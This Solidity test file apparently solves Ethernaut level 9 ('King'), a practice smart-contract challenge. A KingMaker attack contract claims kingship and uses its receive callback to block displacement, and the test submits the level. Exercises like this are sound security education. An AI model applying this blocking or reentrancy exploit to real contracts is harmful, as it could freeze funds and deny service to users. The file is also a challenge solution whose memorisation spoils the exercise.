// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "./EthernautTest.t.sol";

interface King {
    function prize() external returns (uint256);
}

contract KingMaker {
    address public player;
    address public kingContract;

    constructor(address _kingContract) payable {
        // Set msg.sender as the player (us) so we can return all ether
        player = msg.sender;
        // Set the king contract address so we can use in the callback
        kingContract = _kingContract;
        // Send ether to the king contract
        (bool success, ) = _kingContract.call{value: msg.value}("");
        
    }
    
    receive () external payable {
        if (msg.sender == kingContract) {
            // King will call back to this contract again
            // We can immediately reclaim the king and return ether accumulated in this contract
            bool success;
            (success, ) = kingContract.call{value: King(kingContract).prize()}("");
            // Return all ether to the player when reentering
            (success, ) = player.call{value: address(this).balance}("");
        }
    }

}

contract Level9Test is EthernautTest {
    function testLevel9() public {
        // 0.001 ether needed to create level 9
        _createLevel("9", 0.001 ether);

        // We need to send the prize amount to the level contract first
        // We then call our king maker contract with that ether amount
        KingMaker kingMaker = new KingMaker{value: King(levelInstance["9"]).prize()}(levelInstance["9"]);

        
        require(_submitLevel("9"));
    }

    receive() external payable {}
}
